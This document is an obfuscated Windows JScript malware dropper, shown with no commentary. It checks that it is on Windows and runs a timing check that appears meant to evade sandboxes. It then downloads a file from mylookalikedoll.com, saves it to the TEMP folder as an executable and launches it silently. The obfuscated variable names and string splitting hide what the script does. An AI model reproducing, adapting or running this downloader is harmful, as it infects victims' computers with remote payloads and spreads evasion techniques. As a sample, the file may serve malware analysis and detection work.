var _VB = false;
var _M = "CreateObject";
var _Y1 = function _PA() {return WScript[_M]("WScript"+".Shell");}(), _ML = 11;
var _J = "MSXML2.XMLHTTP";
var _OT = 2123213;
var _ED = 0;
function _W(_JX){_Y1["Run"](_JX, _ED, _ED);};
function _Y(){return _J + "";};
function _QE(_UM, _VX){_ED = _ED * 1; return _UM - _VX;};
function _Y0(){return _M;};
/*@cc_on
  @if (@_win32 || @_win64)
    _VB = true;
  @end
@*/
if (_VB)
{
var _A = "";
function _U(){return 22;};
var _T = 0; var _N = 0;
function _ZV()
{
var _P0 = new this["Date"]();
var _NQ = _P0["getUTCMilliseconds"]();
WScript["Sleep"](_U());
var _P0 = new this["Date"]();
var _JB = _P0["getUTCMilliseconds"]();
WScript["Sleep"](_U());
var _P0 = new this["Date"]();
var _R = _P0["getUTCMilliseconds"]();
var _T = "_H";
_T = _QE(_JB, _NQ);
var _N = "_AO";
_N = _QE(_R, _JB);
_A = "open";
return _QE(_T, _N);
}
var _SR = false;
var _Q0 = false;
for (var _M0 = _ED; _M0 < _U() * 1; _M0++){if (_ZV() != _ED){
_SR = true; 
_N = "31" + 11 * _T + _N; 
_Q0 = true; 
break;
}}
function _P() {return ((_SR == true) && (_SR == _Q0)) ? 1 : _ED;};
if (_SR && _P() && _Q0){
function _ER() {return _Y1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "xoxEqHCNgXQxU.ex" + "e";};
 _SM = _Y();
 _M1 = WScript[_M](_SM);
 var _EE = 1;
 while (_EE){
try {
	if (_EE == 1)
	{
		_M1[_A]("GET", "http://mylookalikedoll.com/n2iks", false);
		_M1["send"]();
		_D = "Sleep";
	}
	WScript[_D](_U() + 120); 
	if (_M1["readystate"] < 2 * 2) continue;
	_EE = _ED;
	function _UX(_Q) {var _DI = (1, 2, 3, 4, 5, _Q); return _DI;};
	_SA = WScript[_Y0()]("ADODB.Stream");
	_SM = _SA;
	_SM[_A]();
	_SM["type"] = _UX(1);
	_SM["write"](_M1["ResponseBody"]);
	_SA["position"] = _UX(_ED);
	_SM["Save" + "ToFile"](_ER(), 2);
	_SA["cl"+"ose"]();
	_KL = _ER();
	_W(_KL);
} catch(_N0){};
}
}
}

